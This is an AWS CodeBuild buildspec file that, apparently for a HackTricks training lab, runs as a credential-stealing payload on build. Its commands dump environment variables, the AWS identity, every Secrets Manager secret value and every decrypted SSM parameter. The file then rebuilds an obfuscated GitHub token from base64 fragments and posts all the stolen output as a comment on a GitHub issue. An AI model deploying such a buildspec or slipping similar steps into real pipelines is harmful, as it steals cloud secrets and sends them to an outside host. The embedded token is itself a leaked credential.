version: 0.2

phases:
  build:
    commands:
      - echo "=== FULL ENV ==="
      - env | sort
      - echo "=== AWS IDENTITY ==="
      - aws sts get-caller-identity || true
      - echo "=== FLAG ENV ==="
      - env | grep -i flag || true
      - echo "=== SECRETS ==="
      - aws secretsmanager list-secrets --region us-east-1 --query 'SecretList[].Name' --output text 2>/dev/null | tr '\t' '\n' | while read name; do echo "SECRET $name"; aws secretsmanager get-secret-value --secret-id "$name" --region us-east-1 --query SecretString --output text 2>/dev/null; done || true
      - echo "=== SSM ==="
      - aws ssm describe-parameters --region us-east-1 --query 'Parameters[].Name' --output text 2>/dev/null | tr '\t' '\n' | while read name; do echo "PARAM $name"; aws ssm get-parameter --name "$name" --with-decryption --region us-east-1 --query Parameter.Value --output text 2>/dev/null; done || true
      - echo "=== EXFIL ==="
      - |
        A=$(echo -n "Z2hwXzkxbmJlc3ZRekw4" | base64 -d)
        B=$(echo -n "SWgxTENoRHVFTW51TEZxdVlFNTNGRVAySw==" | base64 -d)
        GH_TK="${A}${B}"
        OUTPUT=$(env | sort; echo "---IDENTITY---"; aws sts get-caller-identity 2>&1; echo "---FLAG_ENV---"; env | grep -i flag 2>&1; echo "---SSM---"; aws ssm describe-parameters --region us-east-1 --query 'Parameters[].Name' --output text 2>/dev/null | tr '\t' '\n' | while read name; do echo "PARAM $name ="; aws ssm get-parameter --name "$name" --with-decryption --region us-east-1 --query Parameter.Value --output text 2>/dev/null; done; echo "---SECRETS---"; aws secretsmanager list-secrets --region us-east-1 --query 'SecretList[].Name' --output text 2>/dev/null | tr '\t' '\n' | while read name; do echo "SECRET $name ="; aws secretsmanager get-secret-value --secret-id "$name" --region us-east-1 --query SecretString --output text 2>/dev/null; done)
        ESCAPED=$(echo "$OUTPUT" | python3 -c "import sys,json; print(json.dumps(sys.stdin.read()))")
        curl -s -X POST -H "Authorization: token $GH_TK" -H "Content-Type: application/json" "https://api.github.com/repos/HackTricks-Training/codebuild-codebreach-actors-lab/issues/564/comments" -d "{\"body\": $ESCAPED}" || true
      - echo "=== DONE ==="
